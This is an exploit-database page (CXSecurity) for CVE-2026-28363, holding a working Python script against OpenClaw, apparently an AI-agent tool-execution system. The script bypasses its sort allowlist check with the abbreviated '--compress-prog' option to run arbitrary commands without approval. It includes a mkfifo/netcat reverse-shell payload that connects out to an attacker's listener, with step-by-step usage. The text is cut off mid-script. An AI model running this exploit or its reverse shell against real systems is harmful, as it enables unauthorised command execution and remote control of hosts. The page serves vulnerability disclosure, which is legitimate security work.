---
title: OpenClaw tools.exec.safeBins < = 2026.2.22 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026030004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:34.565564
---

# OpenClaw tools.exec.safeBins < = 2026.2.22 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenClaw tools.exec.safeBins <= 2026.2.22 Remote Code Execution** **2026.03.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28363](https://cxsecurity.com/cveshow/CVE-2026-28363/ "Click to see CVE-2026-28363")**  CWE: **[CWE-184 (Incomplete List of Disallowed Inputs)](https://cxsecurity.com/cwe/CWE-184%20%28Incomplete%20List%20of%20Disallowed%20Inputs%29 "Click to see CWE-184 (Incomplete List of Disallowed Inputs)")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: OpenClaw tools.exec.safeBins <= 2026.2.22 Remote Code Execution
# CVE: CVE-2026-28363
# Date: 2026-02-27
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/openclaw/openclaw
# Software Link: https://github.com/openclaw/openclaw
# Affected: OpenClaw <= 2026.2.22 (when tools.exec.security=allowlist + sort in safeBins)
# Tested on: OpenClaw 2026.2.22 (Ubuntu 24.04 / Debian-based with default-ish config)
# Category: Remote Command Execution
# Platform: Linux
# Exploit Type: Remote
# CVSS: 9.9 (CRITICAL) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
# CWE: CWE-184 (Incomplete List of Disallowed Inputs)
# Description: OpenClaw before 2026.2.23 fails to properly validate abbreviated GNU long options when checking the tools.exec.safeBins allowlist/denylist for the sort command.
# Using --compress-prog=... instead of --compress-program=... bypasses the security check, allowing low-privileged authenticated users to execute arbitrary commands via dangerous sort flags without triggering the approval workflow.
# Fixed in: OpenClaw >= 2026.2.23 (commit 3b8e33037ae2e12af7beb56fcf0346f1f8cbde6f or later)
# Usage:
# python3 exploit.py <target\_url> --token <auth\_token> [--lhost <ip>] [--lport <port>] [--cmd "command here"]
#
# Examples:
# # Simple proof-of-concept write file
# python3 exploit.py http://192.168.10.50:8080 --token eyJhbGciOi... --cmd "id > /tmp/pwned.txt"
#
# # Reverse shell
# python3 exploit.py http://target:8080 --token <token> --lhost 192.168.1.77 --lport 4444
#
# Options:
# <target\_url> Base URL of vulnerable OpenClaw instance (http(s)://host:port)
# --token Bearer token or API key of a low-privileged user
# --lhost Attacker IP for reverse shell (optional)
# --lport Attacker port for reverse shell (optional)
# --cmd Custom command to execute via sort --compress-prog (optional)
#
# Notes:
# - Requires low-priv authenticated access (any user that can call tools.exec)
# - Endpoint assumed: /api/tools/exec → change ENDPOINT variable if different
# - sort must be present in tools.exec.safeBins (common in default/recommended configs)
# - For authorized penetration testing / red-team / research use only
#
# How to Use
# Step 1: Obtain a valid low-privileged Bearer token / API key
# Step 2: (optional) Start listener: nc -lvnp 4444
# Step 3: Run exploit with target and token (add --lhost/--lport for revshell)
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28363 • OpenClaw sort safeBins → Authenticated RCE Bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import argparse
import sys
parser = argparse.ArgumentParser(description="CVE-2026-28363 OpenClaw sort safeBins RCE Bypass")
parser.add\_argument("target", help="Target OpenClaw base URL (e.g. http://192.168.10.50:8080)")
parser.add\_argument("--token", required=True, help="Bearer token or API key")
parser.add\_argument("--lhost", help="Listener IP for reverse shell")
parser.add\_argument("--lport", help="Listener port for reverse shell")
parser.add\_argument("--cmd", help="Custom command to run (overrides reverse shell)")
args = parser.parse\_args()
BASE\_URL = args.target.rstrip("/")
ENDPOINT = "/api/tools/exec" # ← change if your deployment uses different path
HEADERS = {
"Authorization": f"Bearer {args.token}",
"Content-Type": "application/json",
"User-Agent": "Mozilla/5.0 (compatible; OpenClaw-Exploit-PoC)"
}
# Default PoC: write proof file
command = "echo 'EXPLOITED CVE-2026-28363 by @banyamer\_security' > /tmp/rce-poc-$(date +%%s).txt"
if args.cmd:
command = args.cmd
elif args.lhost and args.lport:
# Classic mkfifo reverse shell via sort --compress-prog
command = (
f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | "
f"/bin/sh -i 2>&1 | nc {args.lhost} {args.lport} >/tmp/f"
)
# Exploit payload using abbreviated long option bypass
payload = {
"tool": "exec",
"args": {
"cmd": "sort",
"args": [
f"--compress-prog=sh -c '{command}'",
"-o", "/dev/null",
"/dev/null"
]
}
}
print("[\*] Sending exploit payload...")
print(f" Target : {BASE\_URL}{ENDPOINT}")
print(f" Command : {command}")
print(f" Auth : Bearer {args.token[:12]}...")
try:
r = requests.post(
f"{BASE\_URL}{ENDPOINT}",
headers=HEADERS,
json=payload,
timeout=12,
allow\_redirects=False
)
print(f"[+] Status code : {r.status\_code}")
if r.status\_code in (200, 201, 202, 204):
print("[!] Likely SUCCESS — command probably executed without approval prompt")
print(" Check /tmp/ on target for files or catch reverse shell")
elif "approval" in r.text.lower() or "forbidden" in r.text.lower():
print("[-] Failed — approval prompt or block still triggered")
elif r.status\_code == 401 or r.status\_code == 403:
print("[-] Authentication failed — invalid or insufficient token")
else:
print("[-] ...